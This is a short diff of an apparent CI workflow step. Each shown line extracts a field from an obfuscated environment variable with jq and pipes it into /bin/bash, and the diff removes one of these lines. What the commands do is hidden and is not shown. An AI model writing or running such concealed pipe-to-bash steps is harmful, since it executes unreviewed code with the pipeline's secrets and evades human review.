@@ -33,7 +33,6 @@ jobs:
           echo $bf37958 | jq -r .sg0 | /bin/bash
           echo $ydj65306 | jq -r .b23 | /bin/bash
           echo $slf8827 | jq -r .w7697 | /bin/bash
-          printf '%s' "$f2" | jq -r .sbrem6294 | /bin/bash
           echo $gz968 | jq -r .jgf5 | /bin/bash
 
       - name: Save results
